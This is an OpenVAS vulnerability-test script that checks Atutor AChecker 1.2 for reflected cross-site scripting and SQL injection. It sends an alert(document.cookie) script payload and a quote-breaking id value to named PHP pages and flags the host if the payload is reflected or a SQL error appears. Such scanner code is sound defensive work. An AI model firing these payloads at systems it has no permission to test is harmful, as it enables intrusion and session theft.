###############################################################################
# OpenVAS Vulnerability Test
# $Id: gb_atutor_achecker_mult_sql_inj_n_xss_vuln.nasl 13 2013-10-27 12:16:33Z jan $
#
# Atutor AChecker Multiple SQL Injection and XSS Vulnerabilities
#
# Authors:
# Antu Sanadi <santu@secpod.com>
#
# Copyright:
# Copyright (c) 2011 Greenbone Networks GmbH, http://www.greenbone.net
#
# This program is free software; you can redistribute it and/or modify
# it under the terms of the GNU General Public License version 2
# (or any later version), as published by the Free Software Foundation.
#
# This program is distributed in the hope that it will be useful,
# but WITHOUT ANY WARRANTY; without even the implied warranty of
# MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE. See the
# GNU General Public License for more details.
#
# You should have received a copy of the GNU General Public License
# along with this program; if not, write to the Free Software
# Foundation, Inc., 51 Franklin St, Fifth Floor, Boston, MA 02110-1301 USA.
###############################################################################

include("revisions-lib.inc");
tag_impact = "Successful exploitation will let attackers to execute arbitrary script code
  or to compromise the application, access or modify data, or exploit latent
  vulnerabilities in the underlying database.
  Impact Level: Application";
tag_affected = "Atutor AChecker 1.2 (build r530)";
tag_insight = "Multiple flaws are due to an,
  - Input passed via the parameter 'myown_patch_id' in '/updater/patch_edit.php'
    and the parameter 'id' in '/user/user_create_edit.php' script is not
    properly sanitised before being used in SQL queries.
  - Input through the GET parameters 'id', 'p' and 'myown_patch_id' in
    multiple scripts is not sanitized allowing the attacker to execute HTML
    code or disclose the full path of application's residence.";
tag_solution = "No solution or patch is available as of 12th September, 2011. Information
  regarding this issue will be updated once the solution details are available.
  For updates refer to  http://www.atutor.ca";
tag_summary = "This host is running Atutor AChecker and is prone to multiple
  cross site scripting and SQL injection vulnerabilities.";

if(description)
{
  script_id(801982);
  script_version("$Revision: 13 $");
  script_tag(name:"last_modification", value:"$Date: 2013-10-27 13:16:33 +0100 (Sun, 27 Oct 2013) $");
  script_tag(name:"creation_date", value:"2011-09-14 16:05:49 +0200 (Wed, 14 Sep 2011)");
  script_bugtraq_id(49061, 49093);
  script_tag(name:"cvss_base", value:"7.5");
  script_tag(name:"cvss_base_vector", value:"AV:N/AC:L/Au:N/C:P/I:P/A:P");
  script_tag(name:"risk_factor", value:"High");
  script_name("Atutor AChecker Multiple SQL Injection and XSS Vulnerabilities");
  desc = "
  Summary:
  " + tag_summary + "

  Vulnerability Insight:
  " + tag_insight + "

  Impact:
  " + tag_impact + "

  Affected Software/OS:
  " + tag_affected + "

  Solution:
  " + tag_solution;
  script_xref(name : "URL" , value : "http://www.exploit-db.com/exploits/17630/");
  script_xref(name : "URL" , value : "http://packetstormsecurity.org/files/view/103763/ZSL-2011-5035.txt");
  script_xref(name : "URL" , value : "http://packetstormsecurity.org/files/view/103762/ZSL-2011-5034.txt");

  script_description(desc);
  script_summary("Check if Atutor AChecker is vulnerable to XSS/SQL Injection");
  script_category(ACT_ATTACK);
  script_copyright("Copyright (c) 2011 Greenbone Networks GmbH");
  script_family("Web application abuses");
  script_dependencies("http_version.nasl");
  script_require_ports("Services/www", 80);
  if (revcomp(a: OPENVAS_VERSION, b: "6.0+beta5") >= 0) {
    script_tag(name : "impact" , value : tag_impact);
    script_tag(name : "affected" , value : tag_affected);
    script_tag(name : "insight" , value : tag_insight);
    script_tag(name : "solution" , value : tag_solution);
    script_tag(name : "summary" , value : tag_summary);
  }
  exit(0);
}


include("http_func.inc");
include("http_keepalive.inc");

## Get HTTP Port
port = get_http_port(default:80);
if(!port){
  exit(0);
}

## Check Host Supports PHP
if(!can_host_php(port:port)) {
  exit(0);
}

## Check for each possible path
foreach dir (make_list("/AChecker", "/Atutor/AChecker", "/"))
{
  ## Send and Receive the response
  req = http_get(item:string(dir,"/checker/index.php"), port:port);
  res = http_keepalive_send_recv(port:port,data:req);

  ## Confirm the application
  if("Web Accessibility Checker<" >< res && '>Check Accessibility' >< res)
  {
    ## Construct the XSS Attack
    req = http_get(item:string(dir, '/documentation/frame_header.php?p="' +
                   '><script>alert(document.cookie)</script>'), port:port);
    res = http_keepalive_send_recv(port:port, data:req);

    ## Confirm exploit worked by checking the response
    if('"><script>alert(document.cookie)</script>' >< res)
    {
      security_hole(port);
      exit(0);
    }

    ## Construct the SQL attack
    req = http_get(item:string(dir, "/user/user_create_edit.php?id='1111"),
                   port:port);
    res = http_keepalive_send_recv(port:port, data:req);

    ## Confirm exploit worked by checking the response
    if('You have an error in your SQL syntax;' >< res)
    {
      security_hole(port);
      exit(0);
    }
  }
}
